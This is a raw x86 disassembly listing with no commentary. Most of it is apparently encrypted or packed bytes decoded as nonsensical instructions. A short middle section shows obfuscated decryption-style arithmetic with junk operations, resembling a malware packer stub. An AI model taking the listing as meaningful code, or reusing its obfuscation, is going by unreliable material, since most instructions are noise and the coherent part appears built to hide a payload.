  408297:	rcr    al,1
  408299:	clc    
  40829a:	(bad)  
  40829b:	(bad)  
  40829d:	leave  
  40829e:	inc    DWORD PTR [eax]
  4082a0:	or     eax,0xcccbc40a
  4082a5:	out    dx,eax
  4082a6:	mov    bh,0xf0
  4082a8:	mov    al,0xd2
  4082aa:	icebp  
  4082ab:	(bad)  
  4082ac:	scas   eax,DWORD PTR es:[edi]
  4082ad:	(bad)  
  4082af:	mov    ecx,0xd6be03cd
  4082b4:	add    cl,bl
  4082b6:	into   
  4082b7:	ret    0xbce5
  4082ba:	loop   0x4082c7
  4082bc:	hlt    
  4082bd:	jmp    0xfc04:0xfec7ed0e
  4082c4:	loop   0x4082ad
  4082c6:	lods   eax,DWORD PTR ds:[esi]
  4082c7:	icebp  
  4082c8:	jecxz  0x4082b5
  4082ca:	out    dx,al
  4082cb:	loope  0x4082b4
  4082cd:	(bad)  
  4082ce:	mov    al,0xea
  4082d0:	div    DWORD PTR [edx+0x2db02d1]
  4082d6:	stc    
  4082d7:	icebp  
  4082d8:	(bad)  
  4082da:	loop   0x4082d1
  4082dc:	(bad)  
  4082dd:	jmp    0xcdc1:0xc8cdd5e1
  4082e4:	scas   al,BYTE PTR es:[edi]
  4082e5:	shl    eax,cl
  4082e7:	mov    ebp,0xc9fab0ef
  4082ec:	ror    bh,1
  4082ee:	aam    0xcc
  4082f0:	mov    bh,0xd0
  4082f2:	fdivr  st,st(2)
  4082f4:	sar    ah,1
  4082f6:	aam    0xc2
  4082f8:	int    0xc2
  4082fa:	mov    ebp,0xebfdf8db
  4082ff:	aad    0xe0
  408301:	retf   
  408302:	or     ecx,ebp
  408304:	in     eax,dx
  408305:	in     al,dx
  408306:	loopne 0x4082ff
  408308:	cmc    
  408309:	fcmovnb st,st(0)
  40830b:	mov    bl,0xe5
  40830d:	repnz shl cl,cl
  408310:	fldz   
  408312:	rcr    ah,cl
  408314:	in     eax,dx
  408315:	mov    edi,0x3d107d5
  40831a:	loop   0x4082d8
  40831c:	retf   0xe0ea
  40831f:	add    ecx,edi
  408321:	cld    
  408322:	iret   
  408323:	add    bh,ch
  408325:	lods   al,BYTE PTR ds:[esi]
  408326:	int3   
  408327:	mov    esp,0xc2c1f3c5
  40832c:	cli    
  40832d:	into   
  40832e:	in     al,0xe8
  408330:	les    esi,FWORD PTR [ebp-0xb33350f]
  408336:	cmc    
  408337:	add    bl,dl
  408339:	std    
  40833a:	cld    
  40833b:	loop   0x408300
  40833d:	(bad)  
  40833e:	or     bl,bl
  408340:	pop    es
  408341:	leave  
  408342:	in     al,0xd3
  408344:	(bad)  
  408346:	mov    cl,0xad
  408348:	call   0xf4fc7344
  40834d:	fdiv   DWORD PTR [ecx+esi*8-0xb020f4b]
  408354:	inc    BYTE PTR [eax]
  408356:	idiv   DWORD PTR [eax-0x7f90010]
  40835c:	or     edi,edi
  40835e:	aad    0x8
  408360:	loopne 0x408349
  408362:	fiadd  WORD PTR [eax]
  408364:	test   eax,0xc4d3e1ee
  408369:	into   
  40836a:	(bad)  
  40836b:	mov    al,0xe8
  40836d:	not    edx
  40836f:	aad    0xd8
  408371:	mov    dh,0xea
  408373:	mov    ah,0x3
  408375:	fdiv   st(7),st
  408377:	hlt    
  408378:	fdiv   st(1),st
  40837a:	add    eax,0xd6e3e0dc
  40837f:	push   es
  408380:	jecxz  0x408356
  408382:	into   
  408383:	in     eax,0xbd
  408385:	loope  0x408351
  408387:	repnz repz cmc 
  40838a:	imul   al
  40838c:	mov    dh,0xf3
  40838e:	in     al,0xfa
  408390:	mov    ebx,0xd6cabed2
  408395:	out    dx,al
  408396:	(bad)  
  408397:	mov    esi,0xebdee3fb
  40839c:	add    eax,DWORD PTR ds:0xc9e6d6e8
  4083a2:	loopne 0x40836e
  4083a4:	loope  0x40834e
  4083a6:	jecxz  0x408355
  4083a8:	mov    al,0xd6
  4083aa:	hlt    
  4083ab:	mov    edx,0xd2b1d9ef
  4083b0:	cli    
  4083b1:	into   
  4083b2:	icebp  
  4083b3:	idiv   DWORD PTR [ecx+eax*8-0x1b2d2504]
  4083ba:	mov    esp,0xfcc9da01
  4083bf:	or     al,ah
  4083c1:	clc    
  4083c2:	retf   0xe200
  4083c5:	scas   al,BYTE PTR es:[edi]
  4083c6:	mov    dl,0xc1
  4083c8:	icebp  
  4083c9:	xlat   BYTE PTR ds:[ebx]
  4083ca:	int3   
  4083cb:	mov    cl,0xd9
  4083cd:	in     eax,dx
  4083ce:	into   
  4083cf:	cli    
  4083d0:	cli    
  4083d1:	idiv   DWORD PTR [ebx+esi*8-0x1272d29]
  4083d8:	aam    0xe7
  4083da:	sti    
  4083db:	icebp  
  4083dc:	loopne 0x4083bc
  4083de:	add    ecx,DWORD PTR ds:0xde7cede
  4083e4:	mov    ebp,0xcaeec6ef
  4083e9:	sti    
  4083ea:	mov    al,0xd5
  4083ec:	shl    DWORD PTR [ebx+edi*4-0x10172d01],0xbf
  4083f4:	mov    edi,0xda06e0db
  4083f9:	out    0xdb,eax
  4083fb:	push   es
  4083fc:	push   es
  4083fd:	retf   0xfd9
  408400:	loop   0x4083d0
  408402:	loope  0x4083fc
  408404:	int    0xb3
  408406:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408407:	out    dx,al
  408408:	mov    ch,0xfb
  40840a:	ror    al,1
  40840c:	out    dx,eax
  40840d:	mov    ecx,0xd3deccf5
  408412:	mov    ebx,0xe2c3f7d0
  408417:	ret    0xe1e2
  40841a:	(bad)  
  40841c:	add    ecx,DWORD PTR [edx]
  40841e:	test   DWORD PTR [ecx],0xdedcf4d8
  408424:	mov    esp,0xe0d7c5c3
  408429:	lock out 0xf6,al
  40842c:	neg    al
  40842e:	clc    
  40842f:	repz (bad) 
  408432:	aad    0xf7
  408434:	enter  0xc702,0xb8
  408438:	ret    
  408439:	loopne 0x4083fd
  40843b:	xlat   BYTE PTR ds:[ebx]
  40843c:	std    
  40843d:	out    0xd6,al
  40843f:	fimul  DWORD PTR [eax]
  408441:	leave  
  408442:	out    0xcb,al
  408444:	mov    esi,0xe5c0c2c0
  408449:	not    cl
  40844b:	out    0xd6,eax
  40844d:	aad    0xb8
  40844f:	int    0xdd
  408451:	out    dx,eax
  408452:	stc    
  408453:	in     eax,dx
  408454:	mov    ecx,0x3d1d5e0
  408459:	mov    esp,0xf8c6d7c7
  40845e:	pop    es
  40845f:	pop    es
  408460:	fcmovnu st,st(6)
  408462:	int3   
  408463:	add    al,0xde
  408465:	out    0xc2,eax
  408467:	ret    0xb4b6
  40846a:	out    0xc5,eax
  40846c:	into   
  40846d:	enter  0xcab0,0xe8
  408471:	into   
  408472:	leave  
  408473:	xlat   BYTE PTR ds:[ebx]
  408474:	mov    ecx,0xda03d7bc
  408479:	add    edi,ecx
  40847b:	add    ebx,ebp
  40847d:	jmp    0xede0:0x60efd0f
  408484:	mov    bl,0xe3
  408486:	icebp  
  408487:	vpmuludq xmm6,xmm3,xmm0
  40848b:	mov    dl,0xb1
  40848d:	out    0xc5,al
  40848f:	fsubp  st(4),st
  408491:	mov    eax,0x200ead7
  408496:	cli    
  408497:	mov    edi,0xdbffddf3
  40849c:	fcmovnb st,st(7)
  40849e:	les    eax,FWORD PTR [ecx]
  4084a0:	or     ch,al
  4084a2:	retf   
  4084a3:	fcmove st,st(2)
  4084a5:	mov    bl,0xd7
  4084a7:	(bad)  
  4084a8:	rcl    esi,cl
  4084aa:	enter  0xb0f3,0xd4
  4084ae:	mov    dh,0xd1
  4084b0:	iret   
  4084b1:	iret   
  4084b2:	bnd ret 0xcced
  4084b6:	aad    0xda
  4084b8:	in     eax,dx
  4084b9:	(bad)  
  4084bb:	or     edi,DWORD PTR [edi-0x41df6f9]
  4084c1:	into   
  4084c2:	jmp    0xb3194db5
  4084c7:	lock in eax,0xd1
  4084ca:	leave  
  4084cb:	xlat   BYTE PTR ds:[ebx]
  4084cc:	(bad)  
  4084cd:	sti    
  4084ce:	xlat   BYTE PTR ds:[ebx]
  4084cf:	out    dx,al
  4084d0:	retf   0xcebb
  4084d3:	aad    0xec
  4084d5:	sti    
  4084d6:	iret   
  4084d7:	loopne 0x4084b2
  4084d9:	loope  0x4084df
  4084db:	rol    BYTE PTR [eax],1
  4084dd:	(bad)  
  4084de:	call   0xdd4279c5
  4084e3:	or     esp,esp
  4084e5:	out    dx,eax
  4084e6:	sar    BYTE PTR [ebp-0x2c1a0a44],cl
  4084ec:	jmp    0x4084a5
  4084ee:	int    0xf1
  4084f0:	fdiv   DWORD PTR [ebp-0x322d041d]
  4084f6:	repnz (bad) 
  4084f9:	cli    
  4084fa:	cli    
  4084fb:	sti    
  4084fc:	jmp    0x4084e5
  4084fe:	or     BYTE PTR [eax],cl
  408500:	jecxz  0x4084ec
  408502:	(bad)  
  408504:	in     al,dx
  408505:	int3   
  408506:	shl    cl,cl
  408508:	in     eax,dx
  408509:	mov    bh,0xca
  40850b:	xlat   BYTE PTR ds:[ebx]
  40850c:	xlat   BYTE PTR ds:[ebx]
  40850d:	(bad)  
  40850e:	fld    st(5)
  408510:	leave  
  408511:	dec    dh
  408513:	mov    ecx,0x3e0bedd
  408518:	add    esi,esp
  40851a:	jmp    0xd507:0xf70fd1c7
  408521:	in     al,0x1
  408523:	rep stos DWORD PTR es:[edi],eax
  408525:	mov    cl,0xac
  408527:	(bad)  
  408529:	call   0xc6307724
  40852e:	iret   
  40852f:	(bad)  
  408530:	stc    
  408531:	out    dx,al
  408532:	mov    esp,0xf5b9c1bc
  408537:	(bad)  
  408538:	fadd   st,st(2)
  40853a:	(bad)  
  40853b:	out    0x8,eax
  40853d:	fsqrt  
  40853f:	fisttp DWORD PTR [ecx]
  408541:	out    0xfb,eax
  408543:	add    BYTE PTR [ecx-0x43420c3a],bh
  408549:	cmc    
  40854a:	hlt    
  40854b:	xlat   BYTE PTR ds:[ebx]
  40854c:	fcom   st(2)
  40854e:	retf   
  40854f:	imul   dl
  408551:	call   edx
  408553:	fdiv   st,st(1)
  408555:	lock add bh,ah
  408558:	(bad)  
  40855a:	(bad)  
  40855b:	lock std 
  40855d:	hlt    
  40855e:	std    
  40855f:	call   0xcf244d6b
  408564:	rol    esi,0xf1
  408567:	(bad)  
  408568:	retf   
  408569:	repz (bad) 
  40856b:	(bad)  
  40856c:	ror    cl,0xd7
  40856f:	lock mov ecx,0xde01d3be
  408575:	fidivr DWORD PTR [ecx-0x1a42fb2f]
  40857b:	sar    DWORD PTR [edi-0x1c29371a],0xdd
  408582:	adc    esi,ecx
  408584:	rol    ah,cl
  408586:	xlat   BYTE PTR ds:[ebx]
  408587:	(bad)
  40858a:	mov    ah,0xd2
  40858c:	loopne 0x408583
  40858e:	(bad)  
  408590:	int3   
  408591:	shr    esp,1
  408593:	in     eax,dx
  408594:	fdivrp st(0),st
  408596:	loopne 0x40855a
  408598:	mov    edi,0xfadeb9d8
  40859d:	add    bl,dl
  40859f:	(bad)  
  4085a1:	jmp    0xd3c8:0xddd1d8f8
  4085a8:	repz mov al,0xb6
  4085ab:	out    dx,eax
  4085ac:	mov    bl,0xdb
  4085ae:	stc    
  4085af:	(bad)  
  4085b0:	into   
  4085b1:	in     eax,dx
  4085b2:	mov    cl,0xd9
  4085b4:	add    ebx,ecx
  4085b6:	in     eax,dx
  4085b7:	hlt    
  4085b8:	ret    0xc0e1
  4085bb:	retf   0x705
  4085be:	add    esp,esi
  4085c0:	call   0xbd526d8a
  4085c5:	shr    ah,0xe6
  4085c8:	out    0xc1,al
  4085ca:	loope  0x40858e
  4085cc:	loopne 0x408594
  4085ce:	xlat   BYTE PTR ds:[ebx]
  4085cf:	retf   0xffd4
  4085d2:	mov    edi,0xfbdaf3be
  4085d7:	sti    
  4085d8:	(bad)
  4085db:	or     al,ch
  4085dd:	mov    esi,0xbe0d4ca
  4085e2:	push   cs
  4085e3:	fld    st(1)
  4085e5:	out    dx,eax
  4085e6:	mov    dl,0xcf
  4085e8:	enter  0xade2,0xc0
  4085ec:	fcmovne st,st(7)
  4085ee:	fdivp  st(2),st
  4085f0:	in     eax,0xbe
  4085f2:	iret   
  4085f3:	int3   
  4085f4:	cmc    
  4085f5:	loopne 0x4085f8
  4085f7:	sar    eax,1
  4085f9:	test   DWORD PTR [edx],0x7e4e502
  4085ff:	aam    0xe5
  408601:	adc    ebp,esp
  408603:	cld    
  408604:	in     al,0xe2
  408606:	imul   bh
  408608:	repz hlt 
  40860a:	(bad)  
  40860b:	retf   
  40860c:	in     eax,0xe7
  40860e:	aam    0xea
  408610:	clc    
  408611:	cli    
  408612:	rcl    al,cl
  408614:	ret    0xcfc0
  408617:	hlt    
  408618:	add    eax,0x1fdf9df
  40861d:	cmc    
  40861e:	in     al,0xe9
  408620:	loopne 0x4085ef
  408622:	push   cs
  408623:	or     ch,ch
  408625:	(bad)  
  408626:	in     eax,dx
  408627:	shr    DWORD PTR [ebp-0x4374a3d],0xb9
  40862e:	in     al,0xc9
  408630:	shr    al,1
  408632:	fdivr  st,st(2)
  408634:	aad    0xd2
  408636:	rol    BYTE PTR [ecx],1
  408638:	mov    esp,0x2fcfbbc
  40863d:	call   0xe045852b
  408642:	fsubr  st(4),st
  408644:	loopne 0x4085f0
  408646:	loopne 0x408639
  408648:	(bad)  
  408649:	out    0xe1,eax
  40864b:	shl    ebp,cl
  40864d:	mov    dh,0xfd
  408650:	cld    
  408651:	not    edx
  408653:	add    esi,esi
  408655:	pop    es
  408656:	fcmovu st,st(1)
  408658:	fcomip st,st(5)
  40865a:	(bad)  
  40865b:	fst    st(4)
  40865d:	enter  0xebe4,0xec
  408661:	retf   0xf307
  408664:	lods   eax,DWORD PTR ds:[esi]
  408665:	icebp  
  408666:	loope  0x408638
  408668:	retf   
  408669:	iret   
  40866a:	idiv   DWORD PTR [edx-0x3204071a]
  408670:	fucomip st,st(1)
  408672:	(bad)  
  408674:	(bad)  
  408675:	aad    0xff
  408677:	(bad)  
  408678:	loop   0x408656
  40867a:	mov    ecx,0x801e6fc
  40867f:	add    al,0xef
  408681:	fstp   st(5)
  408683:	rcr    edi,cl
  408685:	int3   
  408686:	(bad)
  40868b:	lds    esi,FWORD PTR [eax-0x47270b4a]
  408691:	fnsave [ecx-0x6030209]
  408697:	loope  0x40868f
  408699:	sti    
  40869a:	std    
  40869b:	repnz cli 
  40869d:	(bad)  
  40869f:	out    dx,al
  4086a0:	fmulp  st(4),st
  4086a2:	rcr    esi,cl
  4086a4:	mov    esi,0xe8b2f0c0
  4086a9:	retf   
  4086aa:	mov    cl,0xb2
  4086ac:	(bad)  
  4086ae:	out    dx,eax
  4086af:	aam    0xd6
  4086b1:	retf   0xb0cb
  4086b4:	cld    
  4086b5:	icebp  
  4086b6:	(bad)  
  4086b8:	aad    0xe3
  4086ba:	(bad)  
  4086bb:	(bad)  
  4086bd:	add    cl,BYTE PTR [edx]
  4086bf:	add    dh,cl
  4086c1:	into   
  4086c2:	retf   
  4086c3:	add    ebp,DWORD PTR [edx-0x1e3f3529]
  4086c9:	ret    0xedc5
  4086cc:	loope  0x408687
  4086ce:	in     al,dx
  4086cf:	mov    ecx,0xedf5cbe4
  4086d4:	sti    
  4086d5:	mov    ebp,0xffdabed9
  4086da:	rcr    ebx,1
  4086dc:	clc    
  4086dd:	in     eax,0xf
  4086df:	mov    esp,0x1301ffd5
  4086e4:	jecxz  0x4086b3
  4086e6:	(bad)  
  4086e8:	fucomp st(3)
  4086ea:	lods   eax,DWORD PTR ds:[esi]
  4086eb:	in     al,0xe6
  4086ed:	mov    al,0xdb
  4086ef:	in     al,dx
  4086f0:	repz fnstsw WORD PTR [ebp-0x26031726]
  4086f7:	sti    
  4086f8:	repz (bad) 
  4086fa:	jmp    0x4086fa
  4086fc:	retf   
  4086fd:	or     ah,dl
  4086ff:	add    eax,0xce13fbe6
  408704:	mov    cl,0xc1
  408706:	retf   0xf1f0
  408709:	xlat   BYTE PTR ds:[ebx]
  40870a:	rcl    ebx,1
  40870c:	enter  0xcccf,0xd7
  408710:	leave  
  408711:	jmp    0xe3c7:0xdfccf9ff
  408718:	int    0xff
  40871a:	mov    ebp,0xfaffd9e5
  40871f:	fild   DWORD PTR [ebx]
  408721:	cli    
  408722:	int3   
  408723:	int3   
  408724:	int    0xed
  408726:	jmp    0x408719
  408728:	cmc    
  408729:	loope  0x408725
  40872b:	test   al,0xd9
  40872d:	out    0xcc,eax
  40872f:	shr    edi,cl
  408731:	in     al,dx
  408732:	mov    ebx,0xe2b9ffca
  408737:	lock cli 
  408739:	aam    0xf5
  40873b:	fsub   st,st(3)
  40873d:	or     dl,ah
  40873f:	loop   0x40871c
  408741:	call   0xe0eb6720
  408746:	out    0xbc,al
  408748:	enter  0xd7c7,0xb5
  40874c:	les    edi,FWORD PTR [ecx-0x2140142d]
  408752:	add    dh,al
  408754:	iret   
  408755:	hlt    
  408756:	out    dx,eax
  408757:	out    0xd1,eax
  408759:	aam    0x1
  40875b:	loopne 0x408723
  40875d:	clc    
  40875e:	jecxz  0x408768
  408760:	(bad)  
  408761:	(bad)  
  408762:	cld    
  408763:	loopne 0x408734
  408765:	retf   
  408766:	(bad)  
  408767:	test   ah,0xf4
  40876a:	iret   
  40876b:	fcmove st,st(7)
  40876d:	cmc    
  40876e:	fidivr DWORD PTR [edi-0x41140221]
  408774:	mov    esi,0xe3edbef3
  408779:	mov    esi,0x4e3e30b
  40877e:	jecxz  0x40875b
  408780:	in     eax,dx
  408781:	add    ah,cl
  408783:	(bad)  
  408784:	out    dx,al
  408785:	fmul   st,st(1)
  408787:	repz (bad) 
  408789:	int3   
  40878a:	sar    DWORD PTR [ebx-0x6061a11],cl
  408790:	sti    
  408791:	cli    
  408792:	rcr    al,cl
  408794:	(bad)  
  408795:	in     eax,dx
  408796:	ret    
  408797:	int3   
  408798:	fild   DWORD PTR ds:0xc503dae0
  40879e:	aam    0xe
  4087a0:	call   0xd31a69a1
  4087a5:	rcl    bl,0xc2
  4087a8:	out    0xb4,eax
  4087aa:	call   0xe0133870
  4087af:	imul   esp
  4087b1:	repz enter 0xbeca,0xc3
  4087b6:	(bad)  
  4087b7:	std    
  4087b8:	cld    
  4087b9:	cmc    
  4087ba:	out    0x0,eax
  4087bc:	jecxz  0x4087c1
  4087be:	push   cs
  4087bf:	loope  0x4087a7
  4087c1:	(bad)  
  4087c3:	loope  0x408794
  4087c5:	div    DWORD PTR [edi-0x4f354211]
  4087cb:	loop   0x4087b2
  4087cd:	fmul   st,st(5)
  4087cf:	iret   
  4087d0:	icebp  
  4087d1:	idiv   cl
  4087d3:	mov    esi,0xf4bff5ff
  4087d8:	mov    ebp,0x5e4d0be
  4087dd:	add    eax,0xccae204
  4087e2:	fsub   st,st(5)
  4087e4:	repnz mov al,0xc3
  4087e7:	shl    esi,1
  4087e9:	hlt    
  4087ea:	shr    al,cl
  4087ec:	jmp    0xd40b59c5
  4087f1:	mov    dh,0xbc
  4087f3:	jmp    0xe0db:0xf0eeb6db
  4087fa:	(bad)  
  4087fb:	out    0x3,al
  4087fd:	xlat   BYTE PTR ds:[ebx]
  4087fe:	add    eax,0x13fbe4df
  408803:	add    ecx,ecx
  408805:	ret    0xc4cf
  408808:	out    dx,al
  408809:	mov    ch,0xb6
  40880b:	retf   
  40880c:	mov    bl,0xca
  40880e:	fstp   TBYTE PTR [esi-0x2e3205]
  408814:	mov    edi,0xd98303c1
  408819:	add    BYTE PTR [ecx+0x4377730d],al
  40881f:	add    BYTE PTR [edi+0x77],ch
  408822:	inc    ebx
  408823:	add    BYTE PTR ds:0x8a29a14b,dh
  408829:	xor    ecx,0x0
  40882c:	adc    DWORD PTR ds:0x43770f,0x45ac
  408836:	xor    eax,0x8a29a14b
  40883b:	or     DWORD PTR ds:0x437743,0x680c
  408845:	xor    ecx,0x0
  408848:	adc    DWORD PTR ds:0x437737,0x53d4
  408852:	add    eax,0x5424137
  408857:	adc    ecx,0x0
  40885a:	sbb    ecx,DWORD PTR ds:0x437723
  408860:	mov    ecx,DWORD PTR [ebp-0x4]
  408863:	and    DWORD PTR ds:0x4377b3,0x437713
  40886d:	mov    ecx,DWORD PTR [ecx]
  40886f:	sub    DWORD PTR ds:0x43777b,0x4c6e
  408879:	xor    ecx,eax
  40887b:	mov    eax,DWORD PTR [ebp-0x4]
  40887e:	mov    DWORD PTR [eax],ecx
  408880:	and    DWORD PTR ds:0x43776f,0x0
  40888a:	mov    ecx,DWORD PTR ds:0x43776f
  408890:	inc    ecx
  408891:	mov    DWORD PTR ds:0x43776f,ecx
  408897:	cmp    DWORD PTR ds:0x43776f,0x21
  40889e:	jge    0x4088c4
  4088a4:	jmp    0x4088b7
  4088a9:	push   0x43777f
  4088ae:	push   DWORD PTR [ebp-0xc]
  4088b1:	call   DWORD PTR ds:0x43c990
  4088b7:	cmp    DWORD PTR ds:0x43776f,0x1e
  4088be:	jb     0x40888a
  4088c4:	mov    eax,DWORD PTR [ebp+0x14]
  4088c7:	mov    eax,DWORD PTR [eax]
  4088c9:	sbb    ecx,DWORD PTR ds:0x4377b7
  4088cf:	mov    DWORD PTR [ebp-0x24],eax
  4088d2:	mov    DWORD PTR ds:0x43777f,0x1e
  4088dc:	cmp    DWORD PTR ds:0x43777f,0x0
  4088e3:	je     0x408942
  4088e9:	cmp    DWORD PTR ds:0x43777f,0xf
  4088f0:	jbe    0x408942
  4088f6:	jmp    0x408916
  4088fb:	push   DWORD PTR [ebp-0x20]
  4088fe:	push   0x79ea
  408903:	push   0x437038
  408908:	push   0x43707c
  40890d:	push   DWORD PTR [ebp-0x24]
  408910:	call   DWORD PTR ds:0x43c994
  408916:	cmp    DWORD PTR ds:0x43777f,0x10
  40891d:	jne    0x408930
  408923:	mov    ecx,DWORD PTR ds:0x43777f
  408929:	dec    ecx
  40892a:	mov    DWORD PTR ds:0x43777f,ecx
  408930:	mov    ecx,DWORD PTR ds:0x43777f
  408936:	dec    ecx
  408937:	mov    DWORD PTR ds:0x43777f,ecx
  40893d:	jmp    0x4088dc
  408942:	mov    eax,DWORD PTR [ebp-0x24]
  408945:	mov    eax,DWORD PTR [eax]
  408947:	sbb    DWORD PTR ds:0x437717,ebx
  40894d:	mov    ecx,DWORD PTR [ebp-0x4]
  408950:	mov    ecx,DWORD PTR [ecx]
  408952:	or     DWORD PTR ds:0x437733,0x5314
  40895c:	xor    edx,edx
  40895e:	sub    ecx,0x5424137
  408964:	mov    DWORD PTR ds:0x43778b,0x2c2f
  40896e:	sbb    edx,0x0
  408971:	xor    ecx,0x8a29a14b
  408977:	xor    DWORD PTR ds:0x4377b3,0x4c4d
  408981:	xor    edx,0x0
  408984:	add    DWORD PTR ds:0x437787,0x4377b3
  40898e:	xor    ecx,0x8a29a14b
  408994:	and    DWORD PTR ds:0x437717,0x380f
  40899e:	xor    edx,0x0
  4089a1:	add    ecx,0x5424137
  4089a7:	mov    DWORD PTR ds:0x437713,0x5282
  4089b1:	adc    edx,0x0
  4089b4:	mov    eax,DWORD PTR [eax]
  4089b6:	add    DWORD PTR ds:0x43775f,0x43771b
  4089c0:	xor    esi,esi
  4089c2:	sbb    DWORD PTR ds:0x437783,0x7cb2
  4089cc:	add    eax,ecx
  4089ce:	adc    esi,edx
  4089d0:	mov    DWORD PTR ds:0x43773f,edi
  4089d6:	mov    ecx,DWORD PTR [ebp-0x24]
  4089d9:	mov    ecx,DWORD PTR [ecx]
  4089db:	mov    DWORD PTR ds:0x43775b,0x153c
  4089e5:	mov    DWORD PTR [ecx],eax
  4089e7:	mov    eax,DWORD PTR [ebp-0xc]
  4089ea:	mov    DWORD PTR [eax],0x70941f81
  4089f0:	mov    DWORD PTR [eax+0x4],0xffffffff
  4089f7:	jmp    0x40d295
  4089fc:	mov    eax,ds:0x43775b
  408a01:	xor    eax,DWORD PTR ds:0x4377a3
  408a07:	mov    ds:0x43775b,eax
  408a0c:	jmp    0x40ad5a
  408a11:	jl     0x4089e1
  408a13:	push   0x542468a2
  408a18:	hlt    
  408a19:	pop    ds
  408a1a:	nop
  408a1b:	leave  
  408a1c:	mov    dh,BYTE PTR [edx+0x8e03f91]
  408a22:	loop   0x408a9f
  408a24:	jnp    0x4089d0
  408a26:	cwde   
  408a27:	jnp    0x408aa4
  408a29:	out    0xfb,al
  408a2b:	(bad)
  408a2f:	enter  0xc6da,0xa
  408a33:	add    ebp,esp
  408a35:	(bad)  
  408a37:	test   eax,0xecf0e5cf
  408a3c:	loopne 0x408a14
  408a3e:	mov    al,0xd1
  408a40:	in     eax,0xb8
  408a42:	les    esi,FWORD PTR [esi+esi*8-0x24250316]
  408a49:	jecxz  0x408a06
  408a4b:	mov    esp,0x50004c7
  408a50:	retf   
  408a51:	jecxz  0x408a42
  408a53:	retf   0xbe8
  408a56:	icebp  
  408a57:	out    0xca,al
  408a59:	in     eax,0xc8
  408a5b:	mov    dh,0xc3
  408a5d:	mov    ebx,0xe4cee0ba
  408a62:	(bad)  
  408a63:	(bad)  
  408a65:	hlt    
  408a66:	std    
  408a67:	xlat   BYTE PTR ds:[ebx]
  408a68:	shr    esi,0xd6
  408a6b:	(bad)  
  408a6d:	mov    eax,0xf9c7e608
  408a72:	stc    
  408a73:	std    
  408a74:	jecxz  0x408a50
  408a76:	fld    st(0)
  408a78:	jmp    0x408a3c
  408a7a:	div    esp
  408a7c:	aad    0xa8
  408a7e:	cmc    
  408a7f:	out    0xf0,eax
  408a81:	(bad)  
  408a83:	std    
  408a84:	fcmovnu st,st(2)
  408a86:	cmc    
  408a87:	call   0xd4237764
  408a8c:	(bad)  
  408a8d:	(bad)  
  408a8e:	stc    
  408a8f:	out    0xfc,eax
  408a91:	jecxz  0x408a68
  408a93:	into   
  408a94:	or     al,BYTE PTR [esi]
  408a96:	in     al,dx
  408a97:	shl    DWORD PTR [edi-0x31303713],cl
  408a9d:	imul   bh
  408a9f:	lock (bad) 
  408aa2:	fidiv  WORD PTR [edx-0x2c3d003d]
  408aa8:	(bad)  
  408aaa:	repz in al,dx
  408aac:	fsubp  st(2),st
  408aae:	jmp    0x408ab3
  408ab0:	stc    
  408ab1:	or     eax,DWORD PTR [esi]
  408ab3:	push   cs
  408ab4:	ffreep st(4)
  408ab6:	mov    bl,0xc9
  408ab9:	(bad)  
  408abb:	repz in al,0xf7
  408abe:	in     al,dx
  408abf:	xbegin 0xdcf68384
  408ac5:	repnz mov ebx,0xddccd5da
  408acb:	loopne 0x408abe
  408acd:	in     al,0xe2
  408acf:	stc    
  408ad0:	fsubr  st(3),st
  408ad2:	or     cl,BYTE PTR [eiz*8-0x502051fd]
  408ad9:	icebp  
  408ada:	aad    0xee
  408adc:	(bad)  
  408add:	retf   
  408ade:	shl    ah,0xd1
  408ae1:	mov    edi,0xfcd6f5f9
  408ae6:	aad    0xef
  408ae8:	mov    edi,0xdff6f8ed
  408aed:	clc    
  408aee:	test   dl,0xdb
  408af1:	fucomi st,st(7)
  408af3:	in     eax,0xe7
  408af5:	in     al,dx
  408af6:	leave  
  408af7:	retf   0xb3d0
  408afa:	shr    DWORD PTR [ebp-0x321f1f32],cl
  408b00:	in     al,0xcd
  408b02:	cmc    
  408b03:	shl    edi,1
  408b05:	fld    DWORD PTR [ecx]
  408b07:	mov    esp,0xf306c307
  408b0c:	lock in al,0xc5
  408b0f:	aam    0xd5
  408b11:	sti    
  408b12:	iret   
  408b13:	leave  
  408b14:	into   
  408b15:	ror    al,cl
  408b17:	lock in al,dx
  408b19:	aad    0xed
  408b1b:	retf   0xd0f2
  408b1e:	enter  0xf7e9,0xb5
  408b22:	mov    ch,0x3
  408b24:	fcmovnb st,st(3)
  408b26:	add    edi,esi
  408b28:	(bad)  
  408b29:	aad    0xc0
  408b2b:	div    ebp
  408b2d:	pop    es
  408b2e:	mov    edi,0xdb02dce4
  408b33:	ret    0xe6fe
  408b36:	lods   eax,DWORD PTR ds:[esi]
  408b37:	loop   0x408afa
  408b39:	out    0xc8,al
  408b3b:	into   
  408b3c:	mov    ebx,0xd8f4f9d5
  408b41:	mov    bh,0xd6
  408b43:	add    ecx,ebp
  408b45:	(bad)  
  408b47:	into   
  408b48:	stc    
  408b49:	pop    es
  408b4a:	in     eax,0xe3
  408b4c:	jecxz  0x408b4a
  408b4e:	retf   
  408b4f:	or     al,BYTE PTR [eax]
  408b51:	stc    
  408b52:	dec    al
  408b54:	fxch   st(1)
  408b56:	ffree  st(5)
  408b58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b59:	in     al,0xb3
  408b5b:	retf   
  408b5c:	repnz cmc 
  408b5e:	(bad)  
  408b5f:	idiv   edx
  408b61:	int3   
  408b62:	fmul   st(5),st
  408b64:	in     eax,dx
  408b65:	out    dx,al
  408b66:	rol    ecx,cl
  408b68:	inc    DWORD PTR ds:0xe9f3c3c3
  408b6e:	push   es
  408b6f:	or     dh,ch
  408b71:	add    BYTE PTR [esi],cl
  408b73:	int    0xdc
  408b75:	push   ecx
  408b77:	shr    BYTE PTR [ebp-0x16483354],1
  408b7d:	mov    ebx,0xd2cfcaf8
  408b82:	dec    ch
  408b84:	bnd ret 0xd5c9
  408b88:	out    0x7,eax
  408b8a:	ret    
  408b8b:	fadd   QWORD PTR [edi]
  408b8d:	xlat   BYTE PTR ds:[ebx]
  408b8e:	retf   0xc106
  408b91:	call   0x34d948f
  408b96:	retf   
  408b97:	ret    0xeca5
  408b9a:	mov    ebp,0xb1acc5db
  408b9f:	retf   0xe5cc
  408ba2:	jmp    0xbc2e469a
  408ba7:	loope  0x408b67
  408ba9:	into   
  408baa:	pop    es
  408bab:	loopne 0x408b98
  408bad:	(bad)
  408bb0:	psubusw mm0,mm6
  408bb3:	loopne 0x408bb0
  408bb5:	f2xm1  
  408bb7:	int3   
  408bb8:	ret    0xd2b3
  408bbb:	repz jmp 0x408ba5
